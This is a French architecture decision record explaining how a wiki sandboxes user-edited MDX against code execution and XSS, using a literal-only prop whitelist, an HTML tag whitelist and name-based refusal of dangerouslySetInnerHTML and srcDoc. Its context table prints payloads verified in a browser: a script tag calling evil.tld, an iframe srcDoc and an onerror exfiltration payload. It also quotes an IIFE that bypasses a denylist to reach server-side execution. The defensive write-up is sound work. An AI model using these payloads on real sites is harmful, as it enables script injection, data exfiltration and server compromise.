# Rendu du contenu : MDX bridé (sandbox) avec registre de composants

Le contenu des pages est stocké et rendu au format MDX, mais **bridé** : imports/exports interdits, expressions JS de contenu supprimées, expressions d'attribut réduites aux **littéraux statiques**, et seules les balises d'une liste blanche sont rendues — composants (le registre) **comme balises HTML**. La prop `dangerouslySetInnerHTML` est refusée par son nom.

## Contexte

Le contenu est éditable en ligne, sans auth au MVP : n'importe qui peut éditer n'importe quelle page. Or MDX compile en JavaScript exécuté (`import`, `export`, expressions `{…}`) → exécution de code arbitraire (RCE) si on le laisse libre. Whitelister les composants ne suffit pas : ça contrôle *quels composants* s'affichent, pas *l'exécution de JS*.

Tension découverte à l'usage (2026-07-16) : le `blockJS` de `next-mdx-remote`, qui assurait la neutralisation, est un **hachoir** — il supprime tout `mdxJsxAttributeValueExpression` sans regarder son contenu. Une prop JSX ne pouvait donc être qu'une chaîne : `<Image width={400} />` perdait sa largeur en silence, alors que c'est la syntaxe que le ComponentBuilder émet (`serializeAttribute`). Or on veut pouvoir intégrer n'importe quel composant JSX, donc respecter sa spec : une prop `number` doit recevoir un nombre.

**Angle mort découvert (2026-07-17) : le bridage ne regardait que le JS.** Le registre met en liste blanche les balises à **majuscule** ; les balises HTML en **minuscule** n'étaient filtrées par rien et partaient telles quelles à React. Vérifié dans un vrai Chromium, sur `/api/render` :

| Charge | Constat |
| --- | --- |
| `<script src="https://evil.tld/x.js" />` | JS tiers **chargé et exécuté** |
| `<iframe srcDoc="<script>…</script>" />` | **exécuté sur notre propre origine** (un `srcdoc` hérite de l'origine du document qui l'embarque) |
| `<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=…>'}} />` | **exécuté** + exfiltration vers un hôte tiers |

Les deux premiers échappaient au bridage parce que ce sont des balises, pas du JS. Le troisième échappait à la liste blanche des littéraux parce que `{__html: '…'}` **est** un objet littéral parfaitement valide : la charge est une donnée, et c'est la lecture du *nom* de la prop par React qui la transforme en balisage. Aucune des deux règles en place ne pouvait les voir. Et `/api/render?source=…`, ouvert en GET, en faisait une XSS **réfléchie** : un lien forgé suffisait, sans compte ni droit d'édition.

## Décision

Pipeline MDX (`next-mdx-remote` + remark-gfm + mdx-annotations) avec :

- **Registre de composants = répertoire `/components/wiki` + fichier de configuration.** Tout composant `.tsx` de ce répertoire est appelable depuis le contenu ; toute balise hors registre n'est pas rendue. Un descripteur co-localisé (`button.yaml`) ne joue que sur le menu « Composants » de l'éditeur, jamais sur l'autorisation de rendu.
- **`import` / `export` désactivés d'office** (`useDynamicImport: false` ⇒ `removeImportsExportsPlugin` du vendeur).
- **Expressions JS de contenu supprimées** (`{variable}`, `{func()}` dans le texte) : une page est de la donnée, pas un programme.
- **Expressions d'attribut réduites à une liste blanche de littéraux statiques** (`lib/mdx-literal-props.ts`) : nombre, chaîne, booléen, `null`, gabarit sans trou, et tableaux/objets composés uniquement de ceux-là. Tout le reste — identifiant, appel, accès membre, gabarit à trou, spread `{...x}` — est retiré de l'arbre.
- **Balises HTML réduites à une liste blanche** (`lib/mdx-host-elements.ts`) : ce qui met en forme de la prose (structure, texte, listes, tableaux, `a`/`img`), plus `iframe` (voir ci-dessous). Dehors, avec leurs enfants : `script`, `style`, `object`, `embed`, `form`, `link`, `meta`, et tout ce qui n'a pas été mis dedans. La règle ne porte que sur le JSX **tapé par l'auteur** : le HTML que produit markdown (tableau, liste, case à cocher de liste de tâches) naît de nœuds mdast qui ne passent jamais par le chemin JSX.
- **Deux noms de props refusés**, quelle que soit leur valeur (`lib/mdx-literal-props.ts`) : `dangerouslySetInnerHTML` (l'échappatoire de React — sa charge `{__html: '…'}` est un objet littéral valide, seule la lecture du nom en fait du balisage) et `srcDoc` (les deux orthographes : c'est tout le risque d'`<iframe>`, voir ci-dessous). Une liste blanche de noms de props est impossible ici — le projet veut accueillir n'importe quel composant tiers, donc n'importe quel nom.
- **Noms d'attributs HTML collés normalisés** vers leurs noms JSX (`allowfullscreen` → `allowFullScreen`). MDX lit le HTML collé comme du JSX, où les noms sont ceux de React. Ça passe inaperçu pour un attribut inconnu portant une **chaîne** (React le recopie tel quel : `frameborder`, `referrerpolicy`, `class`), mais un attribut **nu** vaut `{true}` et React jette un attribut inconnu portant un booléen. Sur les balises autorisées, un seul est concerné : `allowfullscreen`, que porte tout extrait YouTube (vérifié attribut par attribut : `open`, `download`, `reversed` n'ont pas besoin d'alias).

`mdx-annotations` repose sur les expressions (`{{ id: 'x' }}` est un objet JS fusionné en props) : nos plugins s'exécutent **après** lui dans la liste `remarkPlugins`, donc après qu'il a consommé ses annotations. Le vendeur ajoute ses propres plugins *après* les nôtres, d'où l'ordre effectif : `mdx-annotations` → `remark-gfm` → liste blanche de balises → liste blanche de littéraux → plugins du vendeur.

### `<iframe>` collé et `<Iframe>` construit : deux actions, pas deux façons

La même balise fait deux choses sans rapport, et une seule est dangereuse. **`srcdoc` porte tout le risque** : son contenu hérite de l'origine du document qui l'embarque, donc ses scripts tournent *dans* le wiki (vérifié : `parent` accessible depuis l'intérieur). **Un `src` cross-origin ne le porte pas** : la politique de même origine mure la page embarquée, qui ne peut lire ni notre DOM, ni nos cookies, ni notre `localStorage`. React bloque déjà `javascript:` et donne à `data:` une origine opaque.

D'où la découpe : `srcdoc` refusé par son nom, `<iframe>` gardé. **Interdire la balise aurait cassé l'action réelle sans rien acheter en sécurité** — on ne tape pas une iframe, on la *colle* : YouTube, OpenStreetMap et umap distribuent tous un extrait tout fait, et c'est l'habitude YesWiki des auteurs. L'extrait YouTube passe désormais tel quel, plein écran compris (cf. la normalisation d'`allowfullscreen`).

`<Iframe link="…" />` (`iframe.yaml`, ex-`<Embed>` — renommé et élargi aux pages du wiki, ADR 0022) reste, et n'est pas un doublon : il sert **l'autre action**, celui de l'auteur qui n'a pas d'extrait sous la main mais une URL (ou qui veut afficher une page du wiki), et qui passe par le menu « Composants ». Il ajoute ce qu'une balise collée ne peut pas porter : `https` seul, `sandbox` sans `allow-top-navigation` (sinon la page embarquée redirige l'onglet entier du lecteur au premier clic), `referrer-policy`, et un `title` qu'un champ de formulaire ne laisse pas oublier.

Ce que la balise brute laisse passer, assumé : `allow="camera; microphone"` (le navigateur demande quand même la permission au lecteur) et la navigation de l'onglet par le site embarqué. Sur un wiki sans auth, un auteur malveillant dispose de toute façon de moyens plus directs ; ce n'est pas cette balise qui tient la sécurité.

### Pourquoi une liste blanche, et pas la liste noire du vendeur

`blockJS: false` bascule sur `blockDangerousJS`, une liste noire d'identifiants (`eval`, `Function`, `process`, `require`…) que `next-mdx-remote` qualifie lui-même de « best effort ». **Vérifié** : `<Image width={(() => 400)()} />` la traverse et **s'exécute côté serveur** — l'IIFE ne nomme aucun identifiant interdit. C'était donc un RCE serveur pour quiconque édite une page.

Un littéral statique, lui, n'a **pas de sémantique d'évaluation** : il compile en constante. Pas d'identifiant à résoudre, donc rien d'où s'échapper. La sûreté vient de la construction, pas d'une énumération des dangers connus — une liste noire doit deviner à l'avance tous les chemins vers le constructeur `Function`, une liste blanche n'a rien à deviner.

`blockDangerousJS` reste activé comme seconde couche gratuite, jamais comme la barrière. L'angle mort de 2026-07-17 le confirme par l'exemple : il ne connaît que des globals, il n'a donc jamais rien eu à dire sur une balise ni sur un nom de prop.

Le même raisonnement fixe la forme des deux règles ajoutées. Les **balises** sont une liste blanche : `<marquee>` n'est dangereux pour personne, mais l'énumération des balises nuisibles est un pari sur ce que le HTML et React feront demain, alors que l'énumération de ce qui met en forme de la prose est finie et stable. `dangerouslySetInnerHTML` est l'exception assumée — un refus **par nom**, donc formellement une liste noire, mais d'un seul élément que React fige et dont l'objet déclaré est de contourner l'échappement. Une liste blanche de noms de props est impossible ici : le projet veut justement pouvoir accueillir n'importe quel composant tiers, donc n'importe quel nom de prop.

## Conséquences

- Fidèle à la spec JSX **et** à la spec « format MDX » sans exposer une RCE : un composant reçoit un vrai nombre, un vrai booléen, un vrai tableau. Le bridage ne dépend plus de l'arrivée de l'auth — il est en place, et vaut pour tous les auteurs.
- Le rendu ne peut pas être « moins bridé pour un admin » sans rouvrir cette décision : le sandbox est uniforme.
- **Le rendu reste muet, l'éditeur parle.** Le plugin laisse tomber sans rien dire — une page rendue n'a pas d'auteur à qui parler, et un encart s'adresserait au lecteur. C'est `lib/page-lint.ts` qui répond, via l'action `lintPage` : le premier « Enregistrer » **analyse sans enregistrer** et affiche le panneau (`components/editor/warnings-panel.tsx`), chaque ligne cliquable menant à sa ligne dans la source. Jamais un refus : « Enregistrer quand même » est toujours là. Le contrôle est séparé de `savePage` pour cette raison — l'auteur est encore devant son texte, seul moment où corriger ne coûte rien, et il obtient la réponse même quand rien n'a changé (le seul cas dont un rapport post-enregistrement resterait muet). Sandbox et rapport partagent `isStaticLiteralExpression` : ce qui est refusé et ce qui est annoncé ne peuvent pas diverger.
- **ADR 0010 s'appuyait en partie sur cette neutralisation** pour écarter les props structurées (`items={...}`) : cet argument tombe, un tableau littéral passe désormais. La décision de `<Menu>` tient toujours sur son autre motif — la lisibilité pour un auteur wiki.
- **Les objets littéraux restent acceptés.** Le vecteur `dangerouslySetInnerHTML` aurait pu se fermer en les retirant (aucune prop du projet n'est structurée : `propKind` ne connaît que `string | number | boolean`), mais l'objectif d'accueillir des composants JSX de librairies tierces avec un simple YAML à côté les rend nécessaires. D'où le refus par nom plutôt que par forme.
- **Ajouter une balise à la liste est une action d'opérateur**, comme ajouter une famille de classes dans `globals.css` (ADR 0011) : ça s'édite dans le code, pas depuis le wiki.
- **Une balise refusée n'est pas silencieuse pour l'auteur** : `lib/page-lint.ts` la signale à l'enregistrement (« La balise « <script> » n'est pas autorisée dans une page »). Le rendu, lui, reste muet — voir ci-dessus.
- Tests : `lib/mdx-literal-props.test.ts` (littéraux acceptés, évaluables refusés sans casser la compilation ; `dangerouslySetInnerHTML` refusée sur balise, sur composant et quelle que soit la forme littérale de sa charge) et `lib/mdx-host-elements.test.ts` (balises de prose gardées, markdown intact, `script`/`form`/`object`… retirées avec leurs enfants, `<Iframe>` sandboxé). L'extrait YouTube y est testé **verbatim**, `allowfullscreen` compris : c'est l'action que la liste ne doit pas casser. Chaque refus testé a d'abord été **vu s'exécuter dans un vrai navigateur** avant que la règle existe.
